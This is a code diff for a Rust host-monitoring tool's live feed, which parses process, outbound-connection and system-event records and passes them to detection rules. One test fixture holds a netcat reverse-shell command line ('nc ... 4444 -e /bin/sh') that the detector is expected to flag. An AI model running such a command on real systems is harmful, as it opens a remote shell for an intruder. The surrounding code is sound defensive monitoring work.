@@ -1,11 +1,13 @@
 //! Real-time feeds: one long-lived `ssh` stream per Linux host and one PowerShell
 //! loop for this PC. Lines are classified into feed events, counters and the
-//! current inbound-connection table. Streams reconnect automatically.
+//! current inbound-connection table; new processes, outbound connections and
+//! antivirus/service events go through `rules`. Streams reconnect automatically.
 
 use crate::app::{App, Conn, LiveState};
 use crate::config::{Kind, Target};
 use crate::eval::Level;
 use crate::probe::is_private_ip;
+use crate::rules::{self, Hit, OutSeen, Proc};
 use crate::runner;
 use std::collections::HashSet;
 use std::io::{BufRead, BufReader, Read, Write};
@@ -33,9 +35,25 @@ fn set_live(app: &App, host: &str, state: LiveState, err: &str) {
     }
 }
 
+/// Per-stream state of one host's feed.
+struct Feed {
+    /// The host should never see traffic from public IPs.
+    lan: bool,
+    windows: bool,
+    /// Connection table being received (between CONNS and CONNS_END).
+    pending: Option<Vec<Conn>>,
+    out: OutSeen,
+}
+
 fn run(app: Arc<App>, target: Target) {
     let name = target.name.clone();
-    let lan = !matches!(target.kind, Kind::Remote { lan_only: false });
+    let seen = app.root.join("state").join(format!("{}.outproc", target.state_name()));
+    let mut feed = Feed {
+        lan: !matches!(target.kind, Kind::Remote { lan_only: false }),
+        windows: matches!(target.kind, Kind::Local),
+        pending: None,
+        out: OutSeen::load(Some(seen), crate::now_epoch()),
+    };
     loop {
         if app.is_stopping() {
             return;
@@ -44,9 +62,7 @@ fn run(app: Arc<App>, target: Target) {
         let (mut cmd, stdin_data) = match target.kind {
             Kind::Local => {
                 let script = LIVE_WINDOWS.replace("__INTERVAL__", &INTERVAL_SECS.to_string());
-                let mut c = Command::new("powershell.exe");
-                c.args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-EncodedCommand", &runner::encode_ps(&script)]);
-                (c, None)
+                (runner::powershell_stdin(), Some(script.into_bytes()))
             }
             Kind::Remote { .. } => {
                 let mut c = Command::new("ssh");
@@ -82,7 +98,7 @@ fn run(app: Arc<App>, target: Target) {
                     });
                 }
                 let pid = app.track_child(child);
-                let mut pending: Option<Vec<Conn>> = None;
+                feed.pending = None;
                 let mut connected = false;
                 for line in BufReader::new(stdout).lines() {
                     let Ok(line) = line else { break };
@@ -90,7 +106,7 @@ fn run(app: Arc<App>, target: Target) {
                         connected = true;
                         set_live(&app, &name, LiveState::Connected, "");
                     }
-                    handle_line(&app, &name, lan, line.trim_end(), &mut pending);
+                    handle_line(&app, &name, &mut feed, line.trim_end());
                 }
                 app.forget_child(pid);
                 thread::sleep(Duration::from_millis(300));
@@ -107,8 +123,46 @@ fn run(app: Arc<App>, target: Target) {
     }
 }
 
-fn handle_line(app: &App, host: &str, lan: bool, line: &str, pending: &mut Option<Vec<Conn>>) {
-    if let Some(rest) = line.strip_prefix("EV ") {
+/// Adds a rule hit to the event feed unless an `ignore` line of the config matches
+/// the raw record it came from.
+fn raise(app: &App, host: &str, hit: Hit, raw: &str, ts: u64, public: bool) {
+    let raw = raw.to_lowercase();
+    if app.ignore.iter().any(|i| raw.contains(i.as_str())) {
+        return;
+    }
+    app.lock().push_event(host, hit.level, hit.key, hit.text, public, ts, FOLD);
+}
+
+fn handle_line(app: &App, host: &str, feed: &mut Feed, line: &str) {
+    // "<ts>\t<field>\t<field>..." (process, outbound and system records)
+    let tabbed = |rest: &str| -> (u64, Vec<String>) {
+        let mut f = rest.split('\t').map(str::to_string);
+        let ts = f.next().and_then(|t| t.parse().ok()).unwrap_or_else(crate::now_epoch);
+        (ts, f.collect())
+    };
+    if let Some(rest) = line.strip_prefix("P\t") {
+        // pid, ppid, name, parent, signature, exe path, command line
+        let (ts, f) = tabbed(rest);
+        let get = |i: usize| f.get(i).map(String::as_str).unwrap_or("");
+        let p = Proc { pid: get(0), ppid: get(1), name: get(2), parent: get(3), sig: get(4), path: get(5), cmd: get(6) };
+        if let Some(hit) = rules::process(&p, feed.windows) {
+            raise(app, host, hit, rest, ts, false);
+        }
+    } else if let Some(rest) = line.strip_prefix("O\t") {
+        // program, remote ip, remote port[, signature, exe path]
+        let (ts, f) = tabbed(rest);
+        let get = |i: usize| f.get(i).map(String::as_str).unwrap_or("");
+        let sig = if f.len() > 3 { get(3) } else { "?" };
+        if let Some(hit) = feed.out.observe(get(0), get(1), get(2), sig, get(4), crate::now_epoch()) {
+            raise(app, host, hit, rest, ts, true);
+        }
+    } else if let Some(rest) = line.strip_prefix("X\t") {
+        let (ts, f) = tabbed(rest);
+        let fields: Vec<&str> = f.iter().skip(1).map(String::as_str).collect();
+        if let Some(hit) = rules::system_event(f.first().map(String::as_str).unwrap_or(""), &fields) {
+            raise(app, host, hit, rest, ts, false);
+        }
+    } else if let Some(rest) = line.strip_prefix("EV ") {
         let mut it = rest.splitn(2, ' ');
         let ts = it.next().and_then(|t| t.parse::<f64>().ok()).map(|t| t as u64).unwrap_or_else(crate::now_epoch);
         let body = it.next().unwrap_or("");
@@ -118,13 +172,13 @@ fn handle_line(app: &App, host: &str, lan: bool, line: &str, pending: &mut Optio
             // journalctl short-unix: "<hostname> <ident>[pid]: <message>"
             let mut p = body.splitn(3, ' ');
             let (_, ident, msg) = (p.next(), p.next().unwrap_or(""), p.next().unwrap_or(""));
-            linux_event(app, host, lan, ts, ident, msg);
+            linux_event(app, host, feed.lan, ts, ident, msg);
         }
     } else if line.starts_with("CONNS ") {
-        *pending = Some(Vec::new());
+        feed.pending = Some(Vec::new());
     } else if let Some(rest) = line.strip_prefix("CONN ") {
         let f: Vec<&str> = rest.split_whitespace().collect();
-        if let (Some(list), [_, local, peer, ..]) = (pending.as_mut(), f.as_slice()) {
+        if let (Some(list), [_, local, peer, ..]) = (feed.pending.as_mut(), f.as_slice()) {
             let ip = ip_of(peer);
             list.push(Conn {
                 local: local.to_string(),
@@ -134,10 +188,21 @@ fn handle_line(app: &App, host: &str, lan: bool, line: &str, pending: &mut Optio
             });
         }
     } else if line == "CONNS_END" {
-        if let Some(list) = pending.take() {
-            commit_conns(app, host, lan, list);
+        if let Some(list) = feed.pending.take() {
+            commit_conns(app, host, feed.lan, list);
         }
     }
+}
+
+/// Developer aid (`--replay`): what a saved capture of a live script would raise.
+pub fn replay(windows: bool, text: &str) -> Vec<String> {
+    let kind = if windows { Kind::Local } else { Kind::Remote { lan_only: true } };
+    let app = App::new(std::path::PathBuf::from("."), vec![Target { name: "h".into(), kind }]);
+    let mut feed = Feed { lan: true, windows, pending: None, out: OutSeen::load(None, 0) };
+    for line in text.lines() {
+        handle_line(&app, "h", &mut feed, line.trim_end());
+    }
+    app.lock().events.iter().map(|e| format!("[{}] x{} {}", e.level.label(), e.count, e.text)).collect()
 }
 
 fn commit_conns(app: &App, host: &str, lan: bool, list: Vec<Conn>) {
@@ -306,6 +371,10 @@ mod tests {
         App::new(PathBuf::from("."), vec![Target { name: "h".into(), kind: Kind::Remote { lan_only: true } }])
     }
 
+    fn feed(windows: bool) -> Feed {
+        Feed { lan: true, windows, pending: None, out: OutSeen::load(None, 0) }
+    }
+
     #[test]
     fn extracts_bare_ip() {
         assert_eq!(ip_of("192.168.1.2:22"), "192.168.1.2");
@@ -316,10 +385,10 @@ mod tests {
     #[test]
     fn classifies_ssh_lines() {
         let a = app();
-        let mut p = None;
-        handle_line(&a, "h", true, "EV 100.5 box sshd-session[1]: Accepted publickey for dev from 192.168.1.5 port 5 ssh2", &mut p);
-        handle_line(&a, "h", true, "EV 101 box sshd-session[2]: Invalid user admin from 203.0.113.9 port 4", &mut p);
-        handle_line(&a, "h", true, "EV 102 box kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.7 DST=1.1.1.1 PROTO=UDP DPT=500", &mut p);
+        let mut f = feed(false);
+        handle_line(&a, "h", &mut f, "EV 100.5 box sshd-session[1]: Accepted publickey for dev from 192.168.1.5 port 5 ssh2");
+        handle_line(&a, "h", &mut f, "EV 101 box sshd-session[2]: Invalid user admin from 203.0.113.9 port 4");
+        handle_line(&a, "h", &mut f, "EV 102 box kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.7 DST=1.1.1.1 PROTO=UDP DPT=500");
         let g = a.lock();
         let h = &g.hosts[0];
         assert_eq!(h.counters.get("login"), Some(&1));
@@ -332,13 +401,35 @@ mod tests {
     fn new_public_connection_raises_one_event() {
         let a = app();
         for _ in 0..3 {
-            let mut p = None;
-            handle_line(&a, "h", true, "CONNS 1", &mut p);
-            handle_line(&a, "h", true, "CONN tcp 192.168.1.2:22 203.0.113.5:4000 sshd", &mut p);
-            handle_line(&a, "h", true, "CONNS_END", &mut p);
+            let mut f = feed(false);
+            handle_line(&a, "h", &mut f, "CONNS 1");
+            handle_line(&a, "h", &mut f, "CONN tcp 192.168.1.2:22 203.0.113.5:4000 sshd");
+            handle_line(&a, "h", &mut f, "CONNS_END");
         }
         let g = a.lock();
         assert_eq!(g.hosts[0].conns.len(), 1);
         assert_eq!(g.events.len(), 1);
+    }
+
+    #[test]
+    fn process_outbound_and_system_records_become_events() {
+        let mut a = app();
+        a.ignore = vec!["/opt/mine/".into()];
+        let mut f = feed(false);
+        handle_line(&a, "h", &mut f, "P\t100\t77\t1\tnode\tsystemd\t-\t/usr/bin/node\tnode server.js");
+        handle_line(&a, "h", &mut f, "P\t100\t78\t77\tnc\tnode\t-\t/usr/bin/nc\tnc 203.0.113.5 4444 -e /bin/sh");
+        handle_line(&a, "h", &mut f, "P\t100\t79\t1\ta\tbash\t-\t/tmp/a\t/opt/mine/run /tmp/a");
+        handle_line(&a, "h", &mut f, "P\t100\t80\t1\tsleep\tbash"); // short record: trailing empty fields trimmed
+        handle_line(&a, "h", &mut f, "O\t100\tcurl\t203.0.113.5\t443");
+        handle_line(&a, "h", &mut f, "O\t105\tcurl\t203.0.113.6\t443");
+        let mut w = feed(true);
+        handle_line(&a, "h", &mut w, "O\t100\tapp\t203.0.113.5\t443\t-\tC:\\x\\app.exe"); // signature pending
+        handle_line(&a, "h", &mut w, "X\t100\tLOGCLEAR\tSecurity");
+        let g = a.lock();
+        let texts: Vec<&str> = g.events.iter().map(|e| e.text.as_str()).collect();
+        assert_eq!(texts.len(), 3, "{texts:?}");
+        assert!(texts[0].contains("리버스 셸") && texts[0].contains("PID 78"));
+        assert!(texts[1].contains("curl") && g.events[1].level == Level::Info);
+        assert!(texts[2].contains("Security") && g.events[2].level == Level::Alert);
     }
 }
